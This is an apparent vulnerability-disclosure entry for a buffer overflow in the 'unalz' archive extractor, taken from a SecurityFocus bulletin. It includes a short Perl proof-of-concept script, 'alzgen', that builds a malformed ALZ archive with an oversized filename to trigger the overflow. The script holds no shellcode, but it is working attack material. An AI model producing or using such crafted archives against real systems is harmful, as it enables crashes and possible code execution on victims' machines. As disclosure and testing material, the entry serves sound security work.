source: http://www.securityfocus.com/bid/15577/info

The 'unalz' utility is prone to a buffer-overflow vulnerability. This issue is exposed when the application extracts an ALZ archive that contains a file with a long name.

An attacker could exploit this vulnerability to execute arbitrary code in the context of the user who extracts a malicious archive. 

#!/usr/bin/perl --

# alzgen
# by Ulf Harnhammar in 2005
# I hereby place this program in the public domain.

die "usage: $0 <length> <filename>\n" unless @ARGV == 2;
$len = shift;
$lenhi = int($len / 256);
$lenlo = $len - ($lenhi * 256);
$file = shift;

open(OUT, ">$file") or die "can't open file!\n";
print OUT "\x42\x4c\x5a\x01" .        # SIG_LOCAL_FILE_HEADER
          chr($lenlo) . chr($lenhi) . # filename length
          "\x00" x 7 .
          'U' x $len;
close OUT or die "can't close file!?!?\n";
